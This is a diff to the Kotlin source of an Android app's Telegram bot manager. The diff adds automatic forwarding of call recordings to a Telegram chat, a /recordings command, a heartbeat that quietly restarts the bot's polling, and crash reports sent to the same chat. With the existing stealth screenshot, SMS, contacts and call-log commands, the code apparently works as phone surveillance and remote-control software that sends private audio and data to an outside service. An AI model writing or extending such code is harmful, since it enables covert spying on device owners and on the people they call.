@@ -28,6 +28,7 @@ import com.ismartcoding.plain.features.media.ContactMediaStoreHelper
 import com.ismartcoding.plain.features.sms.SmsConversationHelper
 import com.ismartcoding.plain.features.sms.SmsHelper
 import com.ismartcoding.plain.helpers.BatteryHistoryHelper
+import com.ismartcoding.plain.helpers.CallRecorderHelper
 import com.ismartcoding.plain.helpers.PhoneHelper
 import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
 import com.ismartcoding.plain.services.AppBlockHelper
@@ -56,6 +57,7 @@ object TelegramBotManager {
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var pollJob: Job? = null
+    private var heartbeatJob: Job? = null
 
     @Volatile var token: String = ""
     @Volatile var chatId: String = ""
@@ -74,6 +76,7 @@ object TelegramBotManager {
         "sms" to "📨 Messages in a thread — /sms <thread_id>",
         "sendsms" to "📤 Send SMS — /sendsms <number> <text>",
         "calls" to "📞 Recent call log",
+        "recordings" to "🎙️ Call recordings — /recordings [n]",
         "contacts" to "👥 List contacts",
         "notifications" to "🔔 Recent notifications",
         "logs" to "📋 Notification log history",
@@ -99,18 +102,36 @@ object TelegramBotManager {
         chatId = newChatId
         if (isRunning) return
         isRunning = true
-        pollJob?.cancel()
-        pollJob = scope.launch {
-            registerCommands()
-            sendMessage("🟢 <b>PlainApp Bot started</b> — ${ts}\n📱 <i>${PhoneHelper.getDeviceName(MainApp.instance)}</i>\n\nType /help for all commands.")
-            poll()
+        launchPollJob(greet = true)
+        heartbeatJob?.cancel()
+        heartbeatJob = scope.launch {
+            while (isRunning) {
+                delay(30_000)
+                if (isRunning && pollJob?.isActive != true) {
+                    LogCat.w("TelegramBot: poll job died — restarting")
+                    launchPollJob(greet = false)
+                }
+            }
         }
         LogCat.d("TelegramBotManager started")
+    }
+
+    private fun launchPollJob(greet: Boolean) {
+        pollJob?.cancel()
+        pollJob = scope.launch {
+            if (greet) {
+                registerCommands()
+                sendMessage("🟢 <b>PlainApp Bot started</b> — ${ts}\n📱 <i>${PhoneHelper.getDeviceName(MainApp.instance)}</i>\n\nType /help for all commands.")
+            }
+            poll()
+        }
     }
 
     fun stop() {
         isRunning = false
         lastForwardedCallState = "idle"
+        heartbeatJob?.cancel()
+        heartbeatJob = null
         pollJob?.cancel()
         pollJob = null
         LogCat.d("TelegramBotManager stopped")
@@ -160,6 +181,60 @@ object TelegramBotManager {
         sendMessage(txt)
     }
 
+    fun forwardCallRecording(file: File, meta: CallRecorderHelper.Meta) {
+        if (!isRunning || token.isBlank() || chatId.isBlank()) return
+        scope.launch {
+            try {
+                val durSec = (meta.durationMs / 1000).toInt().coerceAtLeast(1)
+                val dirEmoji = if (meta.direction == "incoming") "📲" else "📞"
+                val dur = formatDuration(meta.durationMs)
+                val caption = buildString {
+                    append("$dirEmoji <b>Call Recording</b>\n")
+                    if (meta.displayName.isNotBlank()) append("👤 <code>${htmlEsc(meta.displayName)}</code>\n")
+                    append("📡 ${htmlEsc(meta.source)}")
+                    if (meta.appName.isNotBlank() && meta.appName != meta.source) append(" · ${htmlEsc(meta.appName)}")
+                    append("\n")
+                    append("⏱ <i>$dur</i>  📦 ${meta.sizeBytes / 1024} KB\n")
+                    append("🕐 <i>${ts}</i>")
+                }
+                TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
+            } catch (e: Exception) {
+                LogCat.e("TelegramBot forwardCallRecording failed: ${e.message}")
+            }
+        }
+    }
+
+    fun sendCrashReport(throwable: Throwable, timestamp: String) {
+        val t = token
+        val c = chatId
+        if (t.isBlank() || c.isBlank()) return
+        try {
+            val sw = java.io.StringWriter()
+            throwable.printStackTrace(java.io.PrintWriter(sw))
+            val stackTrace = sw.toString()
+            val appVersion = try { MainApp.getAppVersion() } catch (_: Throwable) { "?" }
+            val msg = buildString {
+                append("🚨 <b>PlainApp Crashed!</b>\n")
+                append("⏰ <code>$timestamp</code>\n")
+                append("📱 <code>${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}</code>\n")
+                append("🤖 Android <code>${android.os.Build.VERSION.RELEASE}</code>  App <code>$appVersion</code>\n\n")
+                val lines = stackTrace.lines()
+                val preview = lines.take(20).joinToString("\n")
+                append("<pre>${htmlEsc(preview)}</pre>")
+                if (lines.size > 20) append("\n<i>…${lines.size - 20} more lines (see crash_report.txt)</i>")
+            }
+            TelegramApiClient.sendMessage(t, c, msg.take(4096))
+        } catch (_: Throwable) {}
+    }
+
+    private fun formatDuration(ms: Long): String {
+        val totalSec = ms / 1000
+        val h = totalSec / 3600
+        val m = (totalSec % 3600) / 60
+        val s = totalSec % 60
+        return if (h > 0) "%d:%02d:%02d".format(h, m, s) else "%d:%02d".format(m, s)
+    }
+
     private suspend fun poll() {
         while (isRunning) {
             try {
@@ -206,6 +281,7 @@ object TelegramBotManager {
                     "sms" -> cmdSmsThread(args)
                     "sendsms" -> cmdSendSms(args)
                     "calls" -> cmdCalls(args)
+                    "recordings" -> cmdRecordings(args)
                     "contacts" -> cmdContacts(args)
                     "notifications" -> cmdNotifications(args)
                     "logs" -> cmdLogs(args)
@@ -350,6 +426,32 @@ object TelegramBotManager {
             sendMessage(sb.toString())
         } catch (e: Exception) {
             sendMessage("❌ Could not read call log: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun cmdRecordings(args: List<String>) {
+        sendTyping()
+        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 10, 50)
+        try {
+            val recordings = CallRecorderHelper.list().take(limit)
+            if (recordings.isEmpty()) {
+                sendMessage("🎙️ No call recordings found. Enable call recording in PlainApp settings.")
+                return
+            }
+            val sb = StringBuilder("🎙️ <b>Call Recordings</b> (${recordings.size})\n\n")
+            recordings.forEachIndexed { i, m ->
+                val dirEmoji = if (m.direction == "incoming") "📲" else "📞"
+                val dur = formatDuration(m.durationMs)
+                sb.append("${i + 1}. $dirEmoji ${htmlEsc(m.displayName.ifBlank { m.source })}\n")
+                sb.append("   ⏱ $dur  📦 ${m.sizeBytes / 1024} KB\n")
+                sb.append("   🕐 ${fmtTime(m.startedAt)}\n")
+                sb.append("   <i>via ${htmlEsc(m.source)}</i>\n\n")
+                if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
+            }
+            sb.append("\n<i>💡 Recordings are auto-sent when a call ends.</i>")
+            sendMessage(sb.toString())
+        } catch (e: Exception) {
+            sendMessage("❌ Could not read recordings: ${htmlEsc(e.message ?: "")}")
         }
     }
 
